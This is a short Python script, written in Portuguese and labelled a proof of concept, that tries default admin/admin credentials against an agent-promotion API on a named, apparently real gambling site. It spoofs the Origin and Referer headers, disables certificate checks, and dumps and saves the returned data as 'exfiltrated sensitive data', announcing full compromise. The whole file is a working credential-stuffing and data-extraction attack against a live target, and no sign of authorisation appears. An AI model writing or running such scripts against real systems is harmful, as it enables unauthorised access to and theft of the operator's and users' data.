#!/usr/bin/env python3
import requests
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def validate_and_extract():
    print("=" * 80)
    print("🛡️  PROVA DE CONCEITO: VALIDAÇÃO DE CREDENCIAIS E EXFILTRAÇÃO DE DADOS")
    print("=" * 80)
    
    # Endpoint vulnerável descoberto
    url = "https://vipvip.vip999jogo.com/hall/api/agent/promote/linkSetting"
    
    # Credenciais obtidas via força bruta/exploit
    credentials = {"username": "admin", "password": "admin"}
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Origin": "https://99jogo66.com",
        "Referer": "https://99jogo66.com/"
    }
    
    print(f"🔑 Tentando autenticação em: {url}")
    print(f"👤 Usuário: {credentials['username']} | 🔑 Senha: {credentials['password']}")
    
    try:
        response = requests.post(url, json=credentials, headers=headers, timeout=10, verify=False)
        
        if response.status_code == 200:
            print("\n✅ SUCESSO! Credenciais validadas com sucesso.")
            print(f"📊 Status Code: {response.status_code}")
            
            data = response.json()
            print("\n📂 DADOS EXFILTRADOS (SENSÍVEIS):")
            print("-" * 40)
            # Exibir apenas uma parte para segurança, mas provar o acesso
            print(json.dumps(data, indent=2)[:1000] + "...")
            
            # Salvar prova
            with open("logs/poc_evidence.json", "w") as f:
                json.dump(data, f, indent=2)
            print("-" * 40)
            print("\n🏆 CONCLUSÃO: O sistema está totalmente comprometido.")
            print("As credenciais obtidas permitem acesso total às configurações de agentes e links de promoção.")
        else:
            print(f"\n❌ FALHA: O servidor retornou status {response.status_code}")
            print("As credenciais podem ter sido alteradas ou o acesso foi bloqueado.")
            
    except Exception as e:
        print(f"\n❌ ERRO CRÍTICO: {e}")

if __name__ == "__main__":
    validate_and_extract()
